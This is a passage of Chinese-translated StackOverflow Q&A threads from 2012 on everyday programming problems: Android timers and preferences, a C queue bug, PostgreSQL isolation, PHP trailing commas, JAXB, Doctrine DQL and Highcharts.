# StackOverflow 问答 10514000-10514999

# android - 使用用户定义的数字创建倒数计时器

> ID：10514000
> 
> 赞同：0
> 
> 时间：2012-05-09T10:09:32.310
> 
> 标签：android, android-edittext, countdowntimer

我们使用 2 个编辑文本，一个用于输入小时，一个用于输入分钟。

* * *

```
int CountM; 
int CountT;

@Override   
public void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    Mylabel = (EditText)findViewById(R.id.editText1);
    Hours = (EditText)findViewById(R.id.Timer);
    Minuttes = (EditText)findViewById(R.id.Minutter);

void StartTimer()
{
    int TotalT = ((CountT*60*60)+(CountM*60)*1000);

    mTextField = (TextView) findViewById(R.id.TimerTextView);
    CountDownTimer aCounter = new CountDownTimer(TotalT, 1000)
    {
         public void onTick(long millisUntilFinished) 
         {
             mTextField.setText("seconds remaining: " + millisUntilFinished / 1000);
         }
         public void onFinish() 
         {
             mTextField.setText("seconds remaining: " + CountM + CountT);
         }
    };
     aCounter.start();
} 
```

如您所见，我们需要从我们的`Edittext`from中收集数据`Hours into CountT`并将`Minutes into CountM`这些结果输出，将其缩短到几秒钟，以便我们可以将其设置为 5 小时后执行任务。我们尝试过使用字符串并将它们转换为 Ints。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:22:04.900

一件事：

((计数T*60*60)+(计数M*60)*1000); // 稍微扩展一下：

（（计数T*60*60）+（计数M*60）*1000）；// hours/CountT 不乘以 1000

如果对运算符优先级有任何疑问，请使用额外的括号。
如果对运算符优先级没有任何疑问，请使用额外的括号。

调试 101 技巧 #34 - 将复杂的表达式分解为更简单的表达式，这些表达式加载单独的局部变量，以便在调试器中轻松查看确切的操作顺序。如果你写过：

```
int minsTicks=CountM*60*1000;
int hoursTicks=CountT*60*60;
int totalTicks=hoursTicks+minsTicks; 
```

您会立即看到问题，事实上，您可能一开始就不会成功！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:31:05.447

假设您`Button`的布局中有一个，单击哪个，您需要启动计时器，相同的代码将是：

```
Button startBtn;
@Override   
public void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    Mylabel = (EditText)findViewById(R.id.editText1);
    Hours = (EditText)findViewById(R.id.Timer);
    Minuttes = (EditText)findViewById(R.id.Minutter);
    startBtn = (Button)findViewById(R.id.startBtn);
    startBtn.setOnClickListener(new View.OnClickListener() {        
         @Override
         public void onClick(View v) {
             try{
                 String hourStr = Hours.getText().toString();
                 CountT = Integer.parseInt(hourStr);
                 String minuteStr = Minuttes.getText().toString();
                 CountM = Integer.parseInt(minuteStr);
                 StartTimer();
             }catch(NumberFormatException ex){
                 ex.printStackTrace();
             }
         }
    });
} 
```

一个建议：当你还在学习的时候，最好理解并遵循[Java 代码约定](http://www.oracle.com/technetwork/java/codeconv-138413.html)

# android - 长期运行的 Android 服务被一遍又一遍地重新创建

> ID：10514001
> 
> 赞同：0
> 
> 时间：2012-05-09T10:09:34.280
> 
> 标签：android, service, long-integer

> **可能重复：**
> [我的 Android 服务突然停止并创建了一个新服务](https://stackoverflow.com/questions/10506346/my-android-service-is-stopping-abruptly-and-a-new-one-created)

我有一个简单的 Android 活动，带有一个按钮来启动和停止长时间运行的 Android 服务（它执行一些简单的日志记录）。启动服务后，我会关闭应用程序（活动），然后该服务应该无限期地在后台运行。

但事实并非如此。在随机时间，此服务所属的应用程序对象由操作系统重新创建，然后我的服务也是如此。因此，不仅仅是服务被调用 onStartCommand，而是首先调用 onCreate，创建一个新服务。我不知道旧的会发生什么，它就消失了 - 没有调用 onDestroy 或其他任何东西。

我以 START_STICKY 身份运行服务，我没有以任何方式使用主 UI 线程，所以那里应该没有问题。我只是不明白问题是什么。

服务运行良好，然后繁荣，我的应用程序得到一个 onCreate，我的服务得到一个 onCreate 和 onStartCommand，并且在日志记录中间的旧服务消失了，没有任何通知或警告。新服务开始记录。我最终得到一堆断开连接的日志，而应该只有一个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:26:37.253

通常，操作系统会重新启动长时间运行的服务。您可以使用 start_redeliver_intent 而不是使用 start_sticky 标志，这将保留您启动服务的意图并以相同的意图重新启动服务，这在 Start_sticky 中不是这种情况。

此链接可能会有所帮助

[http://developer.android.com/reference/android/app/Service.html#START_REDELIVER_INTENT](http://developer.android.com/reference/android/app/Service.html#START_REDELIVER_INTENT)

# xml - 使用 sencha touch 2 从 xml 获取属性数据

> ID：10514004
> 
> 赞同：0
> 
> 时间：2012-05-09T10:09:47.143
> 
> 标签：xml, cordova, sencha-touch-2

我正在尝试在使用 Phonegap 和 Sencha touch2 进行编程时如何从服务器获取数据。

我正在尝试从 Google Weather API 获取一些天气数据。

我有一个带有列表的面板，现在应该显示 day_of_week 数据。但我找不到如何从属性中获取数据。如果您查看[http://www.google.com/ig/api?weather=zonhoven](http://www.google.com/ig/api?weather=zonhoven)上的 xml，您可以看到星期几表示为：

所以我得到了以下代码：

```
Ext.define('WeerBe.view.mainTabs.TestPage', {
extend : 'Ext.navigation.View',
xtype : 'testPage2',

config : {
    title : 'Test Page2',
    iconCls : 'info',

    scrollable : true,

    items : [{
        xtype : 'list',
        itemTpl: '{day_of_week}',

        store : {
            autoLoad: true,

            fields : ['day_of_week'],

            proxy : {
                type : 'ajax',
                url : 'http://www.google.com/ig/api?weather=zonhoven',
                reader : {
                    type : 'xml',
                    root : 'weather',
                    record: 'forecast_conditions'
                }
            }
        }
    }]
}
}) 
```

列表应该包含 4 条记录，但它不显示数据，因为 day_of_week 节点本身是空的并且数据在 data 属性中。

如何获取属性数据？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:47:44.930

我运行了您的代码并检查了控制台日志。

这是抛出的错误：

> XMLHttpRequest 无法加载 [http://www.google.com/ig/api?weather=zonhoven&_dc=1336560194441&page=1&start=0&limit=25](http://www.google.com/ig/api?weather=zonhoven&_dc=1336560194441&page=1&start=0&limit=25)。Access-Control-Allow-Origin 不允许来源[http://localhost.com 。](http://localhost.com)

该错误是因为您发出的`ajax`请求具有[跨域跨域资源共享。](https://stackoverflow.com/a/10496813/202375)

因此，将代理类型更改为`'jsonp'`

```
proxy : {
      type : 'jsonp',
      url : 'http://www.google.com/ig/api?weather=zonhoven',
      ....
      .... 
```

# android - 在 PrefrenceScreen 中添加一个按钮：Android

> ID：10514005
> 
> 赞同：2
> 
> 时间：2012-05-09T10:09:50.043
> 
> 标签：android, onclick, android-preferences, onclicklistener

嗨，我想在 prefrencescreen 中添加一个按钮，我成功地将一个按钮添加到 prefrence 中，但我无法获得 onClick 事件。我已经附上了我的代码一张偏好屏幕的图片

设置.xml

```
<PreferenceCategory android:title="Application Details">

    <Preference android:key="type" 
                android:title="Type"
                android:summary="" />

</PreferenceCategory>

<PreferenceCategory android:title="Notification Settings">

    <ListPreference android:key="sendNotificationType"
                    android:title="Status Notification For"
                    android:dialogTitle="Status Notification For" />

</PreferenceCategory> 
```

设置细节.xml

```
<TextView
    android:id="@+id/textView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_alignParentTop="true"
    android:layout_alignRight="@+id/textView2"
    android:layout_marginLeft="15dp"
    android:text="Type"
    android:textAppearance="?android:attr/textAppearanceLarge" />

<TextView
    android:id="@+id/textView2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_below="@+id/textView1"
    android:layout_marginLeft="15dp"
    android:layout_toLeftOf="@+id/setFromTimeBtn"
    android:text="Summary"
    android:textAppearance="?android:attr/textAppearanceSmall" />

<Button
    android:id="@+id/buyItNowBtn"
    android:layout_width="80dp"
    android:layout_height="30dp"
    android:layout_alignParentRight="true"
    android:layout_marginRight="15dp"
    android:layout_centerVertical="true"
    android:background="@drawable/button"
    android:text="@string/buyItNowBtnTxt"
    android:textColor="@color/white" /> 
```

以及 prefenceActivity 类的 onCreate 方法

```
protected void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    addPreferencesFromResource(R.layout.setting);
    setContentView(R.layout.settingview);

    Preference typePref = (Preference) findPreference("type");
    typePref.setLayoutResource(R.layout.settingdetail);
typePref.setSelectable(true);

    Button btn = (Button) findViewById(R.id.buyItNowBtn);
    btn.setOnClickListener(new OnClickListener() {

    public void onClick(View arg0) {
        // TODO Auto-generated method stub
        Log.e(TAG,"TEST");
        Toast.makeText(Setting.this, "TEST", Toast.LENGTH_SHORT).show();
    }
});

} 
```

**截屏**

![在此处输入图像描述](../Images/ffad3756615d91df39c75cc37033a62b.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-11-18T12:46:48.140

该线程已过时，但由于尚无解决方案，因此我成功的方法如下：

**1.设置按钮点击监听**

有两种方法可以为按钮设置单击侦听器，以编程方式或通过 XML。

*以编程方式：*在您的自定义首选项中，覆盖`onBindView`并附加监听器：

```
@Override
protected void onBindView(View view) {
    View button = view.findViewById(R.id.myButton);
    button.setOnClickListener(new View.OnClickListener() {
        public void onClick(View v) {
            Log.d(LOG_TAG, "button click listener works!");
        }
    });
    super.onBindView(view);
} 
```

*通过 XML：*添加`android:onClick="yourMethodName"`到`Button`元素的布局定义（这是您偏好的布局的一部分，见下文）并`PreferenceActivity`按照此处所述实现您的方法：[响应点击事件](http://developer.android.com/guide/topics/ui/controls/button.html#HandlingEvents)

**2.修复OnPreferenceClickListener**

现在按钮单击侦听器应该可以工作，但首选项`OnPreferenceClickListener`将不再工作。为了解决这个问题，添加

```
android:descendantFocusability="blocksDescendants" 
```

根据您的喜好到布局文件中的顶部元素：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:minHeight="?android:attr/listPreferredItemHeight"
    android:gravity="center_vertical"
    android:paddingEnd="?android:attr/scrollbarSize"
    android:background="?android:attr/selectableItemBackground"
    android:descendantFocusability="blocksDescendants">

    <ImageView
        android:id="@android:id/icon"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center"
        />

    <RelativeLayout
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginStart="15dip"
        android:layout_marginEnd="6dip"
        android:layout_marginTop="6dip"
        android:layout_marginBottom="6dip"
        android:layout_weight="1">

        <TextView android:id="@android:id/title"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:singleLine="true"
            android:textAppearance="?android:attr/textAppearanceLarge"
            android:ellipsize="marquee"
            android:fadingEdge="horizontal" />

        <TextView android:id="@android:id/summary"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_below="@android:id/title"
            android:layout_alignStart="@android:id/title"
            android:textAppearance="?android:attr/textAppearanceSmall"
            android:textColor="?android:attr/textColorSecondary"
            android:maxLines="4" />

        <Button android:id="@+id/myButton"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentRight="true" />

    </RelativeLayout>

    <!-- Preference should place its actual preference widget here. -->
    <LinearLayout android:id="@android:id/widget_frame"
        android:layout_width="wrap_content"
        android:layout_height="match_parent"
        android:gravity="center_vertical"
        android:orientation="vertical" />
</LinearLayout> 
```

（`android:onClick="yourMethodName"`这里不，因为我选择以编程方式进行。）

**3.附加布局**

最后，您需要将此布局设置为您的首选项 XML 文件：`android:layout="@layout/myLayoutName"`在`setLayoutResource`您的`PreferenceFragment`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:43:37.783

在preferenceActivity中实现OnPreferenceClickListener

```
private Preference mBuyPreference = null;
mLogoutPreference = findPreference(yourkey);
mBuyPreference.setOnPreferenceClickListener(this);

@Override
public boolean onPreferenceClick(Preference preference) {
if (preference == mBuyPreference) {

    try {
        //Do Something
    }

    return false;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-07T11:32:27.753

通过创建这样的自定义首选项，我已经解决了一半的问题 -

为了达到这个目的，我创建了一个这样的自定义首选项 -

```
public class CustomPreference extends Preference {

private LinearLayout mWidgetContainer;
private View mRowView;

public CustomPreference(Context context) {
    super(context);
}

public CustomPreference(Context context, AttributeSet attrs) {
    super(context, attrs);
}

public CustomPreference(Context context, AttributeSet attrs, int defStyle) {
    super(context, attrs, defStyle);
}

@Override
protected View onCreateView(ViewGroup parent) {
    LayoutInflater viewInflater = (LayoutInflater) getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);

    mRowView = viewInflater.inflate(R.layout.preferences_row_view, parent, false);

    mWidgetContainer = (LinearLayout) mRowView.findViewById(android.R.id.widget_frame);

    Button button = new Button(getContext());
    LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);

    button.setLayoutParams(params);
    button.setBackgroundResource(R.drawable.listview_row_bg);
    button.setTextSize(14);
    button.setPadding(5, 5, 5, 5);
    button.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
            Intent intent = new Intent(getContext(), BuyScreenActivity.class);
            getContext().startActivity(intent);
        }
    });
    button.setTypeface(null, Typeface.BOLD);
    button.setText("Buy now");
    mWidgetContainer.addView(button);

    return mRowView;
}
} 
```

然后在您的设置 xml 文件中，您可以创建一个设置，如

```
<package.of.your.java.file.CustomPreference 
    android:key="type" 
    android:title="Type"
    android:summary="" /> 
```

而我的preferences_row_view.xml 是

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:gravity="center_vertical"
    android:minHeight="50dip"
    android:paddingLeft="5dip"
    android:paddingRight="?android:attr/scrollbarSize" >

    <RelativeLayout
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginBottom="6dip"
        android:layout_marginRight="6dip"
        android:layout_marginTop="6dip"
        android:layout_weight="1" >

        <TextView
            android:id="@+android:id/title"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:ellipsize="end"
            android:maxLines="2"
            android:lineSpacingMultiplier="1.3"
            android:textSize="14sp" />

        <TextView
            android:id="@+android:id/summary"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignLeft="@android:id/title"
            android:layout_below="@android:id/title"
            android:maxLines="4"
            android:textSize="13sp" />
    </RelativeLayout>

    <!-- Preference should place its actual preference widget here. -->

    <LinearLayout
        android:id="@+android:id/widget_frame"
        android:layout_width="wrap_content"
        android:layout_height="fill_parent"
        android:gravity="center_vertical"
        android:orientation="horizontal" />

</LinearLayout> 
```

那会做的。

但是我还面临一个问题，我已经在 SO 上发布了这个问题。

[在首选项行中添加一个按钮](https://stackoverflow.com/questions/14194944/add-a-button-in-preference-row)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T10:30:13.063

不要使用 onClick() 处理程序，而是覆盖 PreferenceActivity 中的 onPreferenceTreeClick 方法。在那里，您将获得单击的首选项对象，并且可以检查其键。

```
public boolean onPreferenceTreeClick(PreferenceScreen preferenceScreen, Preference preference) {

 if (preference.getKey().equals("key")) {           
       // do something
       return true;
 }

 return false;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-01-19T04:50:24.753

代替

```
 Button btn = (Button) findViewById(R.id.buyItNowBtn); 
```

做这个

```
 Button btn = (Button)typePref.getView(view, viewGroup ); 
```

# c - 队列没有正确返回后值？

> ID：10514006
> 
> 赞同：0
> 
> 时间：2012-05-09T10:10:00.297
> 
> 标签：c, queue

我想用动态数组创建队列，问题是当我测试 int main() 中的 q.rear 值（用于稍后插入数据）时，它不再是-1了。我做错了哪一部分？

这是一段代码：

```
#include <stdio.h>
#include <conio2.h>
#include <stdlib.h>

typedef struct{
    int *data;
    int front,rear,max;
    }tqueue;
tqueue create(int size)
{
   tqueue q;
   q.data=(int *)malloc(size*sizeof(int));          
   q.front=0;
   q.rear=-1;
   q.max=size;
   return q;   
}
int main()
{
   tqueue q;
   int size=4;
   create(size);
   printf("\n%d",q.rear);
   getch();   
   return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:11:34.570

您有两个不同`tqueue`的 s，都称为`q`。一个（您在其中创建的那个`create`）您初始化，一个（您在其中创建的那个）您`main`没有初始化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:11:54.717

您没有分配`create()`to的结果`q`。以下调用`create()` *并丢弃结果*，保留`q`其原始状态：

```
create(size); 
```

要修复，请将上面的行替换为：

```
q = create(size); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:12:23.563

您忘记分配返回值：

```
q = create(size); 
```

# postgresql - 带有 PostgreSQL 的 Npgsql：使用 UNCOMMITTED READ 看不到未提交的更改

> ID：10514010
> 
> 赞同：1
> 
> 时间：2012-05-09T10:10:23.633
> 
> 标签：postgresql, npgsql

我将 Npsql 与 PostgreSQL 一起使用。我想在另一个事务中查看一个事务的未提交更改。

这就是我创建连接和事务的方式：

```
// create connection
m_Connection = new NpgsqlConnection(connectionString);
m_Connection.Open();

//create transaction
m_Transaction = m_Connection.BeginTransaction(IsolationLevel.ReadUncommitted); 
```

在一个线程中，我像这样插入一行：

```
 NpgsqlCommand command = CreateCommand("INSERT INTO TABLEA  ....", parameters, commandTimeout)
 command.ExecuteNonQuery(); 
```

并在不提交或回滚事务的情况下处理其他内容。

在另一个线程中，我读到这样一行：

```
 NpgsqlCommand command = CreateCommand("SELECT COUNT(*) FROM TABLEA", parameters, commandTimeout);
 command.ExecuteScalar(); 
```

但不知何故，我没有看到第一个 INSERT 的结果。我也没有在 pgAdmin 中看到插入的结果（即使在运行 SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED 之后）。

我究竟做错了什么？任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-09T10:44:46.757

PostgreSQL 不支持未提交的读取。

您将永远无法看到其他未提交事务的更改。

# php - 如何使用jquery删除最后一个逗号'，'

> ID：10514014
> 
> 赞同：1
> 
> 时间：2012-05-09T10:10:39.217
> 
> 标签：php, jquery

如何使用 jquery 删除最后一个逗号'，'。下面是我的幻灯片图像背景代码 jquery，php 代码将在 javascript 中循环图像 url，意味着用户可以在管理员中更改图像：

```
 navigation              :   1,      //Slideshow controls on/off
                thumbnail_navigation    :   1,      //Thumbnail navigation
                slide_counter           :   1,      //Display slide numbers
                slide_captions          :   1,      //Slide caption (Pull from "title" in slides array)
                slides                  :   [       //Slideshow Images
                                                <?php    // this will looping  image background custom - xx_rusly_xx
                                                    $images = getFieldOrder('background_slideshow_image');
                                                        foreach($images as $image){
                                                            echo "{image : '";
                                                            echo get('background_slideshow_image',1,$image);
                                                            echo "'},";
                                                        } 
                                                ?>
                                            ]                           
            }); 
        });

    </script> 
```

如果你看到我为循环图像 url 放了一些 php 代码

```
<?php    // this will looping  image background custom - xx_rusly_xx
$images = getFieldOrder('background_slideshow_image');
    foreach($images as $image){
        echo "{image : '";
        echo get('background_slideshow_image',1,$image);
        echo "'},";
    } 
?> 
```

并且浏览器将使用 php 生成 javascript，如下所示：

```
//Components
        navigation              :   1,      //Slideshow controls on/off
        thumbnail_navigation    :   1,      //Thumbnail navigation
        slide_counter           :   1,      //Display slide numbers
        slide_captions          :   1,      //Slide caption (Pull from "title" in slides array)
        slides                  :   [       //Slideshow Images
        {image : 'http://iconcept-project.com/dev/gd/wp-content/files_mf/1.jpg'},
        {image : 'http://iconcept-project.com/dev/gd/wp-content/files_mf/2.jpg'},
        {image : 'http://iconcept-project.com/dev/gd/wp-content/files_mf/3.jpg'},
        {image : 'http://iconcept-project.com/dev/gd/wp-content/files_mf/4.jpg'},                                                                                                                   ]                           
    }); 
});         
</script> 
```

问题是如何删除最后一行中的逗号，因为使用 Internet Explorer，除非我删除最后一个逗号，否则它不会运行。

```
{image : 'http://iconcept-project.com/dev/gd/wp-content/files_mf/4.jpg'}, 
```

这是完整代码-> [http://pastebin.com/c1A7ZKGr](http://pastebin.com/c1A7ZKGr)

感谢帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:15:02.110

问题不在于您的 js 脚本，而在于 php 脚本。像这样做：

```
<?php    // this will looping  image background custom - xx_rusly_xx
$comma = false;
$images = getFieldOrder('background_slideshow_image');
    foreach($images as $image){
        if ($comma) echo ","; else $comma=true;
        echo "{image : '";
        echo get('background_slideshow_image',1,$image);
        echo "'}";
    } 
?> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:18:04.133

由于 JSON 在 JavaScript 中评估为有效的对象字面量，因此您应该使用[`json_encode` *^([docs])*](http://php.net/manual/en/function.json-encode.php)：

```
<?php    
    $images = getFieldOrder('background_slideshow_image');
    $out = array();
    foreach($images as $image){
        $out[] = array('image' => get('background_slideshow_image',1,$image));
    } 
    echo json_encode($out);
?> 
```

*（您必须删除`[...]`代码中的周围环境）*

使用字符串手动构建文字和代码注定会失败（最终）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-09T10:14:40.847

```
​var string = ​'kurec,kur,kureika,'​;
string.substr(0,string.length-1) 
```

[http://jsfiddle.net/QVpWU/](http://jsfiddle.net/QVpWU/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-09T10:16:04.713

我很好奇。你为什么不在 PHP 端这样做呢？

```
<?php    // this will looping  image background custom - xx_rusly_xx
$images = getFieldOrder('background_slideshow_image');
    foreach($images as $ind => $image){
        echo "{image : '";
        echo get('background_slideshow_image',1,$image);
        echo "'}".($ind == count($images)-1 ? '' : ','); // no comma for last image
    } 
?> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-09T10:16:50.737

javascript：

```
s = s.substring(0, s.length - 1); 
```

或使用[json_encode](http://php.net/manual/fr/function.json-encode.php)而不是自制函数。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-09T10:17:06.883

你应该在 php.ini 中控制它。

```
 foreach($images as $i => $image){
        echo $i === 0 ? "" : ",";
        echo "{image : '";
        echo get('background_slideshow_image',1,$image);
        echo "'}";
    } 
```

# java - 解析 XML 中的问题

> ID：10514017
> 
> 赞同：0
> 
> 时间：2012-05-09T10:10:56.853
> 
> 标签：java, xml, jaxb, xml-parsing, jdom

我已经有了现有的类，我想检查是否有任何方法可以将以下 XML 映射到现有的类中。

**现有 XML（jdom 元素）**

```
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Details>
<Uniqueno>11111</Uniqueno>
<ROWSET name="Persons">
<ROW num="1">
<Name>60821894</Name>
<Age>938338789</Age>
</ROW>
<ROW num="2">
<Name>60821894</Name>
<Age>938338789</Age>
</ROW>
</ROWSET>
</Details> 
```

**现有班级**

```
 @XmlRootElement(name = "Details")
    @XmlAccessorType(XmlAccessType.FIELD)
    class Details{
          @XmlElement(name="Uniqueno")
        String Uniqueno;
        @XmlElement(name="ROWSET")
        private Persons[] persons;

        //setters & getters
    }

    @XmlRootElement(name = "Persons")
    @XmlAccessorType(XmlAccessType.FIELD)
    class Persons{
        @XmlElement(name="name")
        String name;
        @XmlElement(name="age")
        String age;

        //setters & getters
    } 
```

我遇到的问题是：我在 XML 中有一个无法映射的 ROW num，有什么方法可以在不改变 XML 结构的情况下映射相应的类？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-10T07:00:32.610

```
This Code Would work 

@XmlRootElement(name = "Details")
@XmlAccessorType(XmlAccessType.FIELD)
class Details
{
    @XmlElement(name = "Uniqueno")
    String Uniqueno;   

    @XmlElement(name = "ROWSET")
    private Persons[] persons;

    // setters & getters
}

@XmlRootElement(name = "ROWSET")
@XmlAccessorType(XmlAccessType.FIELD)
class Persons
{
    @XmlAttribute
    String name;

    @XmlElement(name = "ROW")
    private Row[] rows;

    // setters & getters
}

@XmlRootElement(name = "ROW")
@XmlAccessorType(XmlAccessType.FIELD)
class Row
{

    @XmlAttribute
    String num;

    @XmlElement
    String Name;

    @XmlElement
    String Age;

    // setters & getters
} 
```

# php - Doctrine 2 DQL - 选择多对多字段为空的行？

> ID：10514019
> 
> 赞同：26
> 
> 时间：2012-05-09T10:11:05.020
> 
> 标签：php, doctrine, dql

在这个例子中我有两个类——DeliveryMethod 和 Country。它们彼此之间具有多对多的关系。

我想要做的是选择没有任何国家映射到它们的所有 DeliveryMethods。

我可以做相反的事情，即选择至少有一个国家的所有交付方式 -

```
SELECT m FROM DeliveryMethod m JOIN m.countries 
```

但我不知道如何选择国家字段为空的位置。在普通的 SQL 中，我会执行以下操作（deliverymethod_country 是链接表）：

```
SELECT m.* FROM deliverymethods m
LEFT JOIN deliverymethod_country dc ON dc.deliverymethod_id = m.id
WHERE dc.deliverymethod_id IS NULL 
```

但是，任何与此等效的 DQL 都不起作用，例如：

```
SELECT m FROM DeliveryMethod m LEFT JOIN m.countries WHERE m.countries IS NULL 
```

这给了我这个错误：

```
[Syntax Error] line 0, col 75: Error: Expected end of string, got 'm' 
```

* * *

## 回答 #1

> 赞同：78
> 
> 时间：2016-10-12T12:43:24.260

## 使用教义`is empty`

它专门用于检查空关联：

```
$qb->select('m')->from('DeliveryMethods', 'm')->where('m.countries is empty') 
```

请参阅：[Doctrine 2 ORM 文档：Doctrine Query Language](http://docs.doctrine-project.org/projects/doctrine-orm/en/latest/reference/dql-doctrine-query-language.html#dql-select-examples "Doctrine 2 ORM 文档：Doctrine Query Language")（搜索“is empty”）

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-05-09T12:48:38.073

那这个呢？假设`$qb`是您的查询构建器实例

```
$qb->select('m')
   ->from('DeliveryMethods','m')
   ->leftJoin('m.countries','c')
   ->having('COUNT(c.id) = 0')
   ->groupBy('m.id'); 
```

这将为您提供与国家相关联的 DeliveryMethods，并且相关国家的数量为 0

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2014-10-08T14:54:29.287

没有必要加入和拥有。只需使用`SIZE`功能：

```
$qb->select('m')
   ->from('DeliveryMethods','m')
   ->where('SIZE(m.countries) = 0'); 
```

这将为您提供所有没有附加国家/地区的方法

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T12:34:51.467

不能加入 NULL 值，IIRC。为推特上的错字道歉，应该说“不能”。

# charts - 在highchart中重绘饼图

> ID：10514025
> 
> 赞同：1
> 
> 时间：2012-05-09T10:11:36.387
> 
> 标签：charts, highcharts, pie-chart

假设我有 4 个切片，分别为 20%、30%、30% 和 20%。如果我使第 4 个切片（20%）处于非活动状态，其他切片应自行调整并占据 100%。如何在highcharts中做到这一点？谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T12:46:04.840

我认为不可能改变这种行为。相反，您需要将点全部删除，以使其他切片加起来为 100。这是一个示例，显示了图例切换和点删除之间的区别：[jsfiddle](http://jsfiddle.net/2Me2z/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-16T14:39:50.303

我认为这应该是标准行为:)

```
opts.plotOptions.pie.point.events.legendItemClick = function() {
    if (this.visible) {
        this['y_old'] = this.y;
        this.update(0);
    }
    else {
        this.update(this.y_old);
    }
}; 
```

现在，当您单击图例项时，饼图切片将消失

如果您想显示百分比（100% 没有现在丢失的切片），您必须将工具提示（或图例）定义为：

```
opts.tooltip.formatter = function() {
    var s = '<b>' + this.point.name + '</b>: ' + this.percentage.toFixed(2) + '%';

    return s;
}; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-06T18:28:26.287

此功能现在开箱即用[`plotOptions.pie.ignoreHiddenPoint`](http://api.highcharts.com/highcharts#plotOptions.pie.ignoreHiddenPoint)

```
 series: [{
    ignoreHiddenPoint: true,
    type: 'pie',
    ...
  }] 
```

[自动重绘/重新计算图例上的饼图 | Highchart & Highstock @ jsFiddle](http://jsfiddle.net/jugal/dTMWP/)

# javascript - 孩子UL对李爸爸动画的奇怪行为

> ID：10514031
> 
> 赞同：0
> 
> 时间：2012-05-09T10:12:01.853
> 
> 标签：javascript, jquery, html, css

[http://jsfiddle.net/RedKnight91/Z6Ueu/4/](http://jsfiddle.net/RedKnight91/Z6Ueu/4/)

你好！查看最后一个菜单（在底部）。当您将鼠标悬停在具有“+”符号的 LI 上时，该 LI 有一个子 UL，它是一个子菜单，slideToggle 会显示子 UL，但是当动画结束时，它会改变宽度。

我可以在 chrome 上更好地看到它。

问题可能是什么？

这是代码：

HTML

```
<ul class="vertical extend color">
        <li class="father">Uova
            <ul>
                <li>Fresche</li>
                <li>Di terra</li>
                <li>Artificiali</li>
            </ul>
        </li>
        <li>burro</li>
        <li class="father">zuppa
            <ul>
                <li>di legumi</li>
                <li>di ceci</li>
                <li>di fagioli</li>
                <li>fredda</li>
                <li>calda</li>
            </ul>
        </li>
        <li>limone</li>
        <li>Acqua</li>
    </ul> 
```

CSS

```
ul{ padding:0; margin: 0; list-style-type: none; font-family: sans-serif; font-weight:bold; }

        li{ background: #EEE; box-shadow: 0 1px 10px #777; padding:5px; margin:0; width:150px; cursor: pointer; text-align: center; text-shadow: 1px 2px 0 white; position: relative; }
        li:hover{ background-color:#333; color:white; text-shadow: 1px 2px 0 black; }

        ul.horizontal{ display: inline; }
        ul.horizontal li { display:inline-block; zoom: 1; *display:inline; }

        ul.vertical li { margin:1px; }

        ul.extend > li:hover { background-color: #EEE; }

        li.father { padding: 5px 10px 0 0; }
        li.father ul { margin-left: -1px; display: none; padding: 0; }
        li.father:hover li { background-color:#EEE; color: #AAA; text-shadow: 1px 2px 0 white; }
        li.father:before { content: "+"; color: #555;}
        li.father:hover:before { content: "-"; color: #FFF;}​ 
```

JAVASCRIPT

```
$(function(){

            $("li.father").hover(
                function(){
